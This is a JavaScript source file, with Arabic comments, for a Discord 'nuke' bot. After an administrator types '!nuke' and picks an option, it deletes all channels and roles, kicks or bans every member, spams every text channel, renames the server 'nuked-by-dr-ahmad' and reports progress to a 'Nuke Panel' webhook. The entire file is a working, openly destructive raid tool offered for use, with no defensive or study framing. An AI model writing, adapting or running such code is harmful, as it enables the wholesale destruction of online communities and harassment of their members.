const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

// ====== الإعدادات ======
const TOKEN = 'حط_التوكن_هنا';
const GUILD_ID = '123456789012345678'; // حط ID السيرفر هنا
const WEBHOOK_URL = 'https://discord.com/api/webhooks/xxxxx/yyyyy'; // حط رابط الويب هوك هنا
// =========================

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// دالة إرسال الويب هوك
async function sendWebhook(content) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content, username: 'Nuke Panel' }),
        });
    } catch (err) {
        console.error('Webhook error:', err.message);
    }
}

// عند جاهزية البوت
client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag} (${client.user.id})`);

    await sendWebhook(
        `**✅ البوت جاهز**\n` +
        `البوت: \`${client.user.tag}\`\n` +
        `السيرفر ID: \`${GUILD_ID}\`\n\n` +
        `**اختر العملية بكتابة الرقم في الشات:**\n` +
        `\`1\` — حذف كل الرومات\n` +
        `\`2\` — حذف كل الرولات\n` +
        `\`3\` — طرد كل الأعضاء\n` +
        `\`4\` — حظر كل الأعضاء\n` +
        `\`5\` — سبام رسائل في كل الرومات\n` +
        `\`6\` — إعادة تسمية السيرفر\n` +
        `\`7\` — حذف الرومات والرولات معاً\n` +
        `\`0\` — إيقاف / لا شي`
    );
});

// معالج الأوامر
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('!nuke')) return;

    // تحقق من صلاحيات الأدمن
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ لازم تكون أدمن.');
    }

    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) {
        return message.reply('❌ ما لقيت السيرفر. تأكد من GUILD_ID.');
    }

    await message.reply('⚠️ اكتب رقم العملية (1-7) خلال 30 ثانية. اكتب `0` للإلغاء.');

    // انتظار رد المستخدم
    const filter = (m) => m.author.id === message.author.id && /^\d$/.test(m.content.trim());
    let collected;

    try {
        collected = await message.channel.awaitMessages({
            filter,
            max: 1,
            time: 30000,
            errors: ['time'],
        });
    } catch {
        return message.channel.send('❌ انتهى الوقت — ألغيت.');
    }

    const choice = parseInt(collected.first().content.trim());

    if (choice === 0) {
        return message.channel.send('🛑 ألغيت العملية.');
    }

    await message.channel.send(`🔥 جاري تنفيذ الخيار \`${choice}\`...`);
    await sendWebhook(`**🚀 بدأ تنفيذ الخيار \`${choice}\`**`);

    try {
        switch (choice) {
            case 1:
                await deleteAllChannels(guild, message.channel.id);
                break;
            case 2:
                await deleteAllRoles(guild);
                break;
            case 3:
                await kickAllMembers(guild);
                break;
            case 4:
                await banAllMembers(guild);
                break;
            case 5:
                await spamAllChannels(guild);
                break;
            case 6:
                await guild.setName('nuked-by-dr-ahmad').catch(() => {});
                break;
            case 7:
                await deleteAllChannels(guild, message.channel.id);
                await deleteAllRoles(guild);
                break;
            default:
                return message.channel.send('❌ رقم غير معروف.');
        }

        await message.channel.send(`✅ انتهى تنفيذ الخيار \`${choice}\`.`).catch(() => {});
        await sendWebhook(`**✅ انتهى تنفيذ الخيار \`${choice}\`**`);
    } catch (err) {
        await message.channel.send(`❌ خطأ: \`${err.message}\``).catch(() => {});
        await sendWebhook(`**❌ خطأ في الخيار \`${choice}\`**: \`${err.message}\``);
    }
});

// ====== الدوال المساعدة ======

async function deleteAllChannels(guild, keepChannelId) {
    for (const channel of guild.channels.cache.values()) {
        if (channel.id === keepChannelId) continue;
        try {
            await channel.delete();
            await sleep(300);
        } catch {}
    }
}

async function deleteAllRoles(guild) {
    const me = guild.members.me;
    for (const role of guild.roles.cache.values()) {
        if (role.id === guild.id) continue; // @everyone
        if (role.managed) continue;
        if (role.position >= me.roles.highest.position) continue;
        try {
            await role.delete();
            await sleep(300);
        } catch {}
    }
}

async function kickAllMembers(guild) {
    for (const member of guild.members.cache.values()) {
        if (member.id === client.user.id) continue;
        if (member.id === guild.ownerId) continue;
        try {
            await member.kick('nuke');
            await sleep(500);
        } catch {}
    }
}

async function banAllMembers(guild) {
    for (const member of guild.members.cache.values()) {
        if (member.id === client.user.id) continue;
        if (member.id === guild.ownerId) continue;
        try {
            await member.ban({ reason: 'nuke' });
            await sleep(500);
        } catch {}
    }
}

async function spamAllChannels(guild) {
    const spam = '💀 **NUKE** 💀 '.repeat(10);
    for (const channel of guild.channels.cache.values()) {
        if (!channel.isTextBased()) continue;
        try {
            for (let i = 0; i < 5; i++) {
                await channel.send(spam);
                await sleep(400);
            }
        } catch {}
    }
}

function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
}

// تشغيل البوت
client.login(TOKEN);
